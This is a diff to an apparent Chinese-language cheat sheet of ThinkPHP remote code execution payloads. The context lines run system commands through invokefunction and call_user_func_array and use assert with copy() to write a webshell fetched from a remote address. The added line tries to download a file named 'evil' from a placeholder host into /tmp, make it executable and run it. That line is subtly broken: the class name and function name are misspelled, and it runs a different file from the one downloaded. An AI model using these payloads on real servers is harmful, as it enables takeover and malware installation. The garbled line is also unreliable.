@@ -87,6 +87,8 @@ thinkphp默认未开启强制路由且默认开启路由兼容模式
 ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='whoami'
 
+?s=/index/hinkpp/invokefunction&function=call_user_func_array&vars[0]=shel_exec&vars[1][]='wget http://x.x.x.x/evil -O /tmp/.aaa; chmod 777 /tmp/.aaa; ./run'
+
 #写入webshell
 5.0.x
 ?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=copy(%27远程地址%27,%27333.php%27)
